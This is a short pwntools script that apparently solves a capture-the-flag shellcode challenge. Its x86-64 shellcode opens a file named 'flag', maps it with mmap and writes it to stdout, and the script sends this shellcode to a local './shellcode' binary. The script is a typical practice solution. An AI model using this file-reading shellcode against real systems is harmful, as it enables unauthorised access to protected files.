from pwn import *
context.arch = 'amd64'
sc = asm("""
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov r12,rax; test rax,rax; js die
    xor edi,edi; mov esi,0x100; mov edx,1
    mov r10d,2; mov r8,r12; xor r9d,r9d; mov eax,9; syscall
    mov rsi,rax; mov eax,1; mov edi,1; mov edx,0x100; syscall
die: jmp $
flag: .asciz "flag"
""")
io = process('./shellcode')
io.recvuntil(b"Send your shellcode:")
io.send(sc)
io.recvuntil(b"Executing now!")
print(io.recvall(timeout=3).decode(errors='replace'))
io.close()
